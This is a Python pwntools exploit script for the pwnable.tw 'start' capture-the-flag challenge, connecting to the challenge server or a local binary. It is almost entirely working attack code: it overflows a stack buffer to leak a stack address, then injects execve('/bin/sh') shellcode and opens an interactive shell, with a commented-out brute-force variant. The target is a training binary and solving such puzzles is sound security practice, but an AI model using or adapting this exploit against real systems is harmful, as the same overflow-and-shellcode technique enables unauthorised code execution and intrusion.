#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('start', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x8048097

        c
        ''')
        sleep(1)
if args.REMOTE:
    p = remote('chall.pwnable.tw', 10000)
    
else:
    p = process([exe.path])
GDB()

shell = asm("""
shell:
    mov al, 0xb       
    cdq                   
    lea ebx, [ecx - 0x18] 
    xor ecx, ecx         
    int 0x80               
"""
)
write= 0x08048087 
load  = b'/bin/sh\0'.ljust(0x14, b'\0')
load += p32(write)

sa(b"Let's start the CTF:", load)
stack = u32(r(4))
info(f'stack: {hex(stack)}')
load = flat(
    shell.ljust(0x14, b'\0'),
    stack -0x4
)

s(load)


p.interactive()

# while True:
#     if args.REMOTE:
#         p = remote('chall.pwnable.tw', 10000)
        
#     else:
#         p = process([exe.path])

#     load = asm("""
#     shell:
#         sub al, 0xe            
#         cdq                   
#         lea ebx, [ecx + 0xc] 
#         xor ecx, ecx         
#         int 0x80               
#         jmp shell
#     """
#     )
#     load += b'/bin/sh\0'
#     load += p32(0x0804809c)
#     load += p8(0x1e)

#     sa(b"Let's start the CTF:", load)
#     try: 
#         sl(b'ls')
#         if b'start' in p.recvline():
#             p.interactive()
#             break

#         else:
#             p.close()
#             continue

#     except EOFError:
#         p.close()
#         continue
